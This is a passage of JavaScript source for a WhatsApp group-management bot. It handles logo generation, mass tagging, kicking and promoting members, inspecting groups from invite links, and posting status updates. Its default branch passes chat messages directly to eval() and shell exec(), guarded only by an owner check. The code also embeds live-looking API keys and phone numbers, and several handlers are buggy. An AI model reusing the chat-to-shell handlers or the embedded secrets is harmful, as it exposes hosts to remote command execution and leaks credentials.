                   case prefix+'hubcomment':  
                   if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} hypermod&mod*`)
                   var F = body.slice(9)
				   var F1 = F.split("&")[0];
				   var F2 = F.split("&")[1]; 
                   reply(`Wait sending your logo👻`)
                   anu = await getBuffer(`https://api.zeks.me/api/phub?apikey=7hlxnlcTIjkaYRnCabIkkCDaBMX&img=https://1.bp.blogspot.com/-x8KhcOBG-yw/XiU4pi1yWVI/AAAAAAAADBA/gK8tsLyc1lQ808A348IKzDCjf6fUBKONwCLcBGAsYHQ/s1600/cara+buat+foto+profil+di+whatsapp+menjadi+unik.jpg&username=${F1}&msg=${F2}`)
                   hyper.sendMessage(from, anu, image, {caption: `Made By Hyper Mod `, quoted: mek})
                   break
                   case prefix+'flower':  
                   if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} HYPER MOD*`)
                   query = args.join(" ")
                   reply(`Wait sending your logo👻`)
                   anu = await getBuffer(`https://api.zeks.me/api/flowertext?apikey=7hlxnlcTIjkaYRnCabIkkCDaBMX&text=${query}`)
                   hyper.sendMessage(from, anu, image, {caption: `Made By Hyper Mod `, quoted: mek})
                   break 
                   case prefix+'spiderman':  
                   if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} HYPER MOD*`)
                   query = args.join(" ")
                   reply(`Wait sending your logo👻`)
                   anu = await getBuffer(`https://bx-hunter.herokuapp.com/api/flamingtext/spider?text=${query}&apikey=Ikyy69`)
                   hyper.sendMessage(from, anu, image, {caption: `Made By Hyper Mod `, quoted: mek})
                   break 
                   case prefix+'hidetag':
					if (!isGroup) return reply(ind.groupo())
					if (!isGroupAdmins && !isOwner) return reply(ind.admin())
					var value = body.slice(9)
					var group = await hyper.groupMetadata(from)
					var member = group['participants']
					var mem = []
					member.map( async adm => {
					mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
					})
					var options = {
					text: value,
					contextInfo: { mentionedJid: mem },
					quoted: mek
					}
					hyper.sendMessage(from, options, text)
					await limitAdd(sender)
					break
				    case prefix+'tagall':
					if (!isGroup) return reply(ind.groupo())
					if (!isGroupAdmins && !isOwner) return reply(ind.admin())
					members_id = []
					teks = (args.length > 1) ? body.slice(8).trim() : ''
					teks += '\n\n'
					for (let mem of groupMembers) {
						teks += `*~>* @${mem.jid.split('@')[0]}\n`
						members_id.push(mem.jid)
					}
					mentions(teks, members_id, true)
					break
		            case prefix+'clearall':
					if (!isOwner) return reply(ind.ownerb())
					anu = await hyper.chats.all()
					hyper.setMaxListeners(25)
					for (let _ of anu) {
						hyper.deleteChat(_.jid)
					}
					reply(ind.clears())
case prefix+'group-open':
      if (!isGroup) return fakestatus('```ONLY GROUP```')
    if (!isGroupAdmins) return fakestatus('```Only for admins```')
    if (!isBotGroupAdmins) return fakestatus('```the bot isn"t an admin```')
  try {
      setTimeout( () => {
		hyper.groupSettingChange(from, GroupSettingChange.messageSend, false)
  }, 1000)
      		setTimeout( () => {
					hyper.sendMessage(from, `*「 SUCCESSFUL GROUP OPENING 」*`, MessageType.text)
		}, 3000)
  } catch {
  		fakegroup('```sorry boss can"t```')
  }
  break

case prefix+'group-close':
      if (!isGroup) return fakestatus('```ONLY GROUP```')
    if (!isGroupAdmins) return fakestatus('```Only for admins```')
    if (!isBotGroupAdmins) return fakestatus('```the bot isn"t an admin```')
  try {
      setTimeout( () => {
				 hyper.groupSettingChange(from, GroupSettingChange.messageSend, true)
  }, 1000)
      		setTimeout( () => {
			hyper.sendMessage(from, `*「 SUCCESSFUL CLOSING GROUP 」*`, MessageType.text)
		}, 3000)
  } catch {
  		fakegroup('```sorry boss can"t```')
  }
  break
  

case prefix+'add':
      if (!isGroup) return fakestatus('```ONLY GROUP```')
    if (!isGroupAdmins) return fakestatus('```Only for admins```')
    if (!isBotGroupAdmins) return fakestatus('```the bot isn"t an admin```')
					if (args.length < 1) return fakestatus('Who wants to add? -_-')
					if (args[0].startsWith('08')) return reply('Use language code kkk')
					try {
					num = `${args[0].replace(/ /g, '')}@s.whatsapp.net`
					hyper.groupAdd(from, [num])
					} catch (e) {
					console.log('Error :', e)
					fakestatus('you want to add is private, come on:)')
					}
					reply('「 ```SUCCESS``` 」')
					break
case prefix+'kick':
      if (!isGroup) return fakestatus('```ONLY GROUP```')
    if (!isGroupAdmins) return fakestatus('```Only for admins```')
    if (!isBotGroupAdmins) return fakestatus('```the bot isn"t an admin```')
			    if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('TAG HIS TARGET')
				  mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
			     if (mentioned.length > 1) {
					teks = ''
					for (let _ of mentioned) {
						teks += `Bismillah atas izin admin grup kamu akan saya tendang !\n`
						teks += `@_.split('@')[0]`
						}
						mentions(teks, mentioned, true)
						hyper.groupRemove(from, mentioned)
				  } else {
						mentions(`「 🕹 」 User @${mentioned[0].split('@')[0]} \nGoodbye, don't come back 👋🏻`, mentioned, true)
						hyper.groupRemove(from, mentioned)
				  }
				  break
case prefix+ 'demote':
      if (!isGroup) return fakestatus('```ONLY GROUP```')
    if (!isGroupAdmins) return fakestatus('```Only for admins```')
    if (!isBotGroupAdmins) return fakestatus('```the bot isn"t an admin```')
					if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('*TAG TARGET !*')
					mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
					if (mentioned.length > 1) {
						teks = ''
						for (let _ of mentioned) {
							teks += `「 D E M O T E 」\n\n「 🕹 」 User @_.split('@')[0]\n`
							teks += `Downgrading As a Group Member`
						}
						mentions(teks, mentioned, true)
						hyper.groupDemoteAdmin(from, mentioned)
					} else {
						mentions(`「 D E M O T E 」\n\n「 🕹 」 User @${mentioned[0].split('@')[0]}\nDowngrading As a Group Member`, mentioned, true)
						hyper.groupDemoteAdmin(from, mentioned)
					}
					break

case prefix+ 'promote':
      if (!isGroup) return fakestatus('```ONLY GROUP```')
    if (!isGroupAdmins) return fakestatus('```Only for admins```')
    if (!isBotGroupAdmins) return fakestatus('```the bot isn"t an admin```')
					if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('*TAG TARGET !*')
					mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
					if (mentioned.length > 1) {
						teks = ''
						for (let _ of mentioned) {
							teks += `「 P R O M O T E 」\n\n「 🕹 」 User @_.split('@')[0]\n`
							teks += `Upgrading As Group Admin`
						}
						mentions(teks, mentioned, true)
						hyper.groupMakeAdmin(from, mentioned)
					} else {
						mentions(`「 P R O M O T E 」\n\n「 🕹 」 User @${mentioned[0].split('@')[0]}\nUpgrading As Group Admin`, mentioned, true)
						hyper.groupMakeAdmin(from, mentioned)
					}
					break

case prefix+'listadmin':
					if (!isGroup) return fakestatus('```GROUP ONLY```')
					teks = `*GROUP TOP LIST* \n_${groupMetadata.subject}_\n*TOTAL* : ${groupAdmins.length}\n\n`
					no = 0
					for (let admon of groupAdmins) {
					no += 1
					teks += `[${no.toString()}] @${admon.split('@')[0]}\n`
					}
					mentions(teks, groupAdmins, true)
					break
case prefix+'inspect':
		            try {
		            if (!isUrl(args[0]) && !args[0].includes('chat.whatsapp.com')) return reply(mess.Iv)
		            if (!q) return reply('```Enter the group link```')
		            cos = args[0]
		            var net = cos.split('https://chat.whatsapp.com/')[1]
		            if (!net) return reply('make sure it"s a link https://whatsapp.com/')
		            jids = []
		            let { id, owner, subject, subjectOwner, desc, descId, participants, size, descOwner, descTime, creation} = await hyper.query({ 
		            json: ["query", "invite",net],
		            expect200:true })
		            let par = `*Id* : ${id}
		${owner ? `*Owner* : @${owner.split('@')[0]}` : '*Owner* : -'}
		*Nama Gc* : ${subject}
		*Gc created Date* : ${formatDate(creation * 1000)}
		*Number of Members* : ${size}
		${desc ? `*Desc* : ${desc}` : '*Desc* : there is not any'}
		*Id desc* : ${descId}
		${descOwner ? `*Desc modified by* : @${descOwner.split('@')[0]}` : '*Desc modified by* : -'}\n*Tanggal* : ${descTime ? `${formatDate(descTime * 1000)}` : '-'}\n\n*Saved contacts*\n`
		           for ( let y of participants) {
		             par += `> @${y.id.split('@')[0]}\n*Admin* : ${y.isAdmin ? 'Ya' : 'Tidak'}\n`
		             jids.push(`${y.id.replace(/@c.us/g,'@s.whatsapp.net')}`)
		             }
		             jids.push(`${owner ? `${owner.replace(/@c.us/g,'@s.whatsapp.net')}` : '-'}`)
		             jids.push(`${descOwner ? `${descOwner.replace(/@c.us/g,'@s.whatsapp.net')}` : '-'}`)
		             hyper.sendMessage(from,par,text,{quoted:mek,contextInfo:{mentionedJid:jids}})
		             } catch {
		             reply('Link error')
		             }
		             break
case prefix+ 'gclink':
      if (!isGroup) return fakestatus('```ONLY GROUP```')
    if (!isGroupAdmins) return fakestatus('```Only for admins```')
    if (!isBotGroupAdmins) return fakestatus('```the bot isn"t an admin```')
				linkgc = await hyper.groupInviteCode (from)
				yeh = `LINK GROUP \n\n*GROUP NAME* : \n*${groupName}*\nhttps://chat.whatsapp.com/${linkgc}`
				hyper.sendMessage(from, yeh, text, {quoted: mek})
				break
case prefix+ 'resetgclink':
      if (!isGroup) return fakestatus('```ONLY GROUP```')
    if (!isGroupAdmins) return fakestatus('```Only for admins```')
    if (!isBotGroupAdmins) return fakestatus('```the bot isn"t an admin```')
				linkgc = await hyper.revokeInvite(from)
				yeh = `GROUP LINK HAS RESETTED\n\n*GROUP NAME* : \n*${groupName}*`
				hyper.sendMessage(from, yeh, text, {quoted: mek})
				break

//pembuat bot
case prefix+'owner':
	members_ids = []
	for (let mem of groupMembers) {
	members_ids.push(mem.jid)
	}
	vcard2 = 'BEGIN:VCARD\n'
	+ 'VERSION:3.0\n'
	+ `FN:${setting.ownername}\n`
	+ `ORG: Creator ${setting.ownername} ;\n`
	+ `TEL;type=CELL;type=VOICE;waid=${setting.ownerNumber}:${setting.ownerNumberr}\n`
	+ 'END:VCARD'.trim()
	hyper.sendMessage(from, {displayName: `Creator ${setting.ownername}`, vcard: vcard2}, contact, 
	{ quoted: fkontak, 
	//contextInfo: {"mentionedJid": members_ids}
	})
	reply('MY OWNER"S NUMBER [(>_<)] DON"T BE RUDE YAA')
	break

case prefix+'creator':
let conarray = []
ownerContact = ['94767043432','94753943957']
for (let i of ownerContact.map(v => v + '@s.whatsapp.net')) {
var vname = hyper.contacts[i] != undefined ? hyper.contacts[i].vname || hyper.contacts[i].notify : await hyper.getName(i)
conarray.push({
"displayName": '@HYPER MOD',
"vcard": `BEGIN:VCARD\nVERSION:3.0\nN:Sy;Bot;;;\nFN:${vname ? `${vname}` : `${hyper.user.name}`}\nitem1.TEL;waid=${i.split('@')[0]}:${i.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`,
"displayName": '@SUPUN',
"vcard": `BEGIN:VCARD\nVERSION:3.0\nN:Sy;Bot;;;\nFN:${vname ? `${vname}` : `${hyper.user.name}`}\nitem1.TEL;waid=${i.split('@')[0]}:${i.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`,
"displayName": 'Wa',
"vcard": `BEGIN:VCARD\nVERSION:3.0\nN:Sy;Bot;;;\nFN:${vname ? `${vname}` : `${hyper.user.name}`}\nitem1.TEL;waid=${i.split('@')[0]}:${i.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`
})
}
hehe = await hyper.sendMessage(from, {
"displayName": `${conarray.length} kontak`,
"contacts": conarray 
}, 'contactsArrayMessage',{ quoted: fkontak})
break


//buat owner
case prefix+ 'setppbot':
  	if (!mek.key.fromMe) return fakestatus('```OWNER ONLY```')
    if (((isMedia && !mek.message.videoMessage) ||  isQuotedImage ||  isQuotedSticker) && args.length == 0 ) {
          try{
          enmediau = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					mediau = await hyper.downloadAndSaveMediaMessage(enmediau)
					await hyper.updateProfilePicture(botNumber, mediau)
		            reply(`👍`)
          }catch (e) {
						reply('ERROR')
          }
    } else {
        reply(`Kirim gambar dengan caption ${prefix}setppbot`);
    }
		break
case prefix+'buatgrup':
               if (!mek.key.fromMe) return fakestatus('```OWNER ONLY```')
				if (args.length < 1) return reply(`Penggunaan ${prefix}creategrup nama grup|@tag member`)
				argza = arg.split('|')
				if (mek.message.extendedTextMessage != undefined){
                mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
                for (let i = 0; i < mentioned.length; i++){
				anu = []
				anu.push(mentioned[i])
                }
				hyper.groupCreate(argza[0], anu)
				reply(`Sukes membuat grup:\n${argza}`)
                }
				break
case prefix+ 'join':
		if (!mek.key.fromMe) return fakestatus('```OWNER ONLY```')
		try {
		if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return reply(mess.Iv)
		hen = args[0]
		if (!q) return fakestatus('Enter the group link')
		var codeInvite = hen.split('https://chat.whatsapp.com/')[1]
		if (!codeInvite) return fakegroup ('make sure the link is correct!')
		var response = await hyper.acceptInvite(codeInvite)
		fakestatus('```SUCCESS JOIN GRUP```')
		} catch {
		fakegroup('```LINK ERROR!```')
		}
		break


//up menu
case prefix+ 'upswteks':
		if (!mek.key.fromMe) return fakestatus('```OWNER ONLY```')
		if (!q) return fakestatus('Fill in the text!')
		hyper.sendMessage('status@broadcast', `${q}`, extendedText)
		fakeitem(`SUCCESS Up story wea teks ${q}`)
		break
case prefix+ 'upswimage':
		if (!mek.key.fromMe) return fakestatus('```OWNER ONLY```')
		if (isQuotedImage) {
		const swsw = isQuotedImage 
    ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
    .extendedTextMessage.contextInfo
    : mek;
    cihcih = await hyper.downloadMediaMessage(swsw);
    hyper.sendMessage("status@broadcast", cihcih, image, {caption: `${q}`,});
    bur = `SUCCESS Upload Story Image dengan Caption: ${q}`;
    hyper.sendMessage(from, bur, text, { quoted: mek });
    } else {
    fakegroup('```Reply the picture!```');
    }
		break
case prefix+ 'upswvideo':
		if (!mek.key.fromMe) return fakestatus('```OWNER ONLY```')
		if (isQuotedVideo) {
		const swsw = isQuotedVideo
    ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
    .extendedTextMessage.contextInfo
    : mek;
    cihcih = await hyper.downloadMediaMessage(swsw);
    hyper.sendMessage("status@broadcast", cihcih, video, {caption: `${q}`,});
    bur = `SUCCESS Upload Story Video dengan Caption: ${q}`;
    hyper.sendMessage(from, bur, text, { quoted: mek });
    } else {
       fakegroup('```Reply the video!```');
    }
		break


		default:		
		
		if (budy.startsWith('.>')){
    if (!mek.key.fromMe) return fakestatus('```OWNER ONLY```')
       try {
          function Res(res) {
          ev = JSON.stringify(res, null, 2)
          al = util.format(ev)
          if (ev == undefined){
          al = util.format(ev)
          }
          return reply(`${al}`)
          }
          reply(util.format(eval(`(async () => { ${q} })()`)))
       } catch(e) {
          emror = String(e)
          reply(`${emror}`)
        }}

    if (budy.startsWith('$')){
    if (!isOwner && !mek.key.fromMe) return await reply('Maap ni, gw gk kenal lu')
    if (!mek.key.fromMe) return fakestatus('```OWNER ONLY```')
    qur = budy.slice(2)
    exec(qur, (err, stdout) => {
    if (err) return reply(`FERDIZ-AFK : ~ ${err}`)
    if (stdout) {
    reply(" *FERDIZ-AFK* :\n\n\n"+stdout)
    }
    })
    }
    
    
    if (body.startsWith('<')) {
    if (!mek.key.fromMe) return fakestatus('```OWNER ONLY```')
        try {
            return hyper.sendMessage(from, JSON.stringify(eval(`${args.join(' ')}`),null,'\t'),text, {quoted: mek})
        } catch (e) {
        reply(e)
        }}

//Akhir dari case
}
// akhir dari semua fitur
if (isGroup && budy != undefined) {
	} else {
	console.log(color('[PRIVATE-CHAT]', 'aqua'), '[message]', color(command), 'nomor', color(sender.split('@')[0]))
	}		
	} catch (e) {
    e = String(e)
    if (!e.includes("this.isZero")) {
	console.log('Message : %s', color(e, 'green'))
        }
	// console.log(e)
	}
}
